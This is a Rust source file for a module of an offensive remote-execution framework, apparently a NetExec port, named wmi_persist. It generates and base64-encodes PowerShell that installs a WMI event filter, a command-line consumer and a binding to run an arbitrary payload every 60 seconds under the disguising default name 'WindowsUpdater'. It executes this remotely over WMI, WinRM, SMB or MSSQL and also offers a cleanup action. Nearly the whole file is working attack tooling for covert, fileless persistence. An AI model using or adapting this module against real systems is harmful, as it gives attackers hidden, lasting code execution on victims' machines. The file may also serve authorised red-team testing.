//! # wmi_persist — WMI Fileless Persistence Module
//!
//! Creates or removes WMI Event Subscriptions for fileless persistence on the target.

use anyhow::Result;
use async_trait::async_trait;
use nxc_protocols::{NxcSession, NxcProtocol};

use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};

pub struct WmiPersistModule;

impl WmiPersistModule {
    pub fn new() -> Self {
        Self
    }
}

impl Default for WmiPersistModule {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl NxcModule for WmiPersistModule {
    fn name(&self) -> &'static str {
        "wmi_persist"
    }

    fn description(&self) -> &'static str {
        "Install or remove WMI Event Subscriptions for fileless persistence"
    }

    fn supported_protocols(&self) -> &[&str] {
        &["wmi", "winrm", "smb", "mssql"]
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![
            ModuleOption {
                name: "PAYLOAD".to_string(),
                description: "Command to execute (e.g. 'cmd.exe /c calc.exe'). Required if action=install.".to_string(),
                required: false,
                default: None,
            },
            ModuleOption {
                name: "ACTION".to_string(),
                description: "Action to perform: 'install' or 'cleanup'".to_string(),
                required: false,
                default: Some("install".to_string()),
            },
            ModuleOption {
                name: "NAME".to_string(),
                description: "Name of the subscription (default: 'WindowsUpdater')".to_string(),
                required: false,
                default: Some("WindowsUpdater".to_string()),
            },
        ]
    }

    async fn run(
        &self,
        session: &mut dyn NxcSession,
        opts: &ModuleOptions,
    ) -> Result<ModuleResult> {
        let action = opts.get("ACTION").map(|s| s.as_str()).unwrap_or("install");
        let name = opts.get("NAME").map(|s| s.as_str()).unwrap_or("WindowsUpdater");
        
        let script = if action == "install" {
            let payload = opts.get("PAYLOAD").ok_or_else(|| anyhow::anyhow!("PAYLOAD option is required for install"))?;
            format!(
                r#"$f=Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{{Name='{0}';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System"'}}
$c=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{{Name='{0}';CommandLineTemplate='{1}'}}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{{Filter=$f;Consumer=$c}}
Write-Output 'WMI Persistence Installed Successfully'"#,
                name, payload
            )
        } else if action == "cleanup" {
            format!(
                r#"Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='{0}'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='{0}'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {{ $_.Filter -match '{0}' }} | Remove-WmiObject
Write-Output 'WMI Persistence Cleaned Up Successfully'"#,
                name
            )
        } else {
            return Err(anyhow::anyhow!("Invalid ACTION: must be 'install' or 'cleanup'"));
        };

        // Base64 encode the script to avoid quoting issues
        let b64_script = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, script.encode_utf16().flat_map(|u| u.to_le_bytes()).collect::<Vec<u8>>());
        let cmd = format!("powershell -e {}", b64_script);

        // Execute via the active protocol
        let output = match session.protocol() {
            "wmi" => {
                let proto = nxc_protocols::wmi::WmiProtocol::new();
                proto.execute(session, &cmd).await?
            }
            "winrm" => {
                let proto = nxc_protocols::winrm::WinrmProtocol::new();
                proto.execute(session, &cmd).await?
            }
            "smb" => {
                let proto = nxc_protocols::smb::SmbProtocol::new();
                proto.execute(session, &cmd).await?
            }
            "mssql" => {
                let proto = nxc_protocols::mssql::MssqlProtocol::new();
                proto.execute(session, &cmd).await?
            }
            _ => return Err(anyhow::anyhow!("Protocol {} does not support execution", session.protocol())),
        };

        Ok(ModuleResult {
            credentials: vec![], success: true,
            output: format!("Execution Output:\n{}", output.stdout),
            data: serde_json::json!({
                "action": action,
                "name": name,
                "status": "completed",
                "stdout": output.stdout.trim()
            }),
        })
    }
}
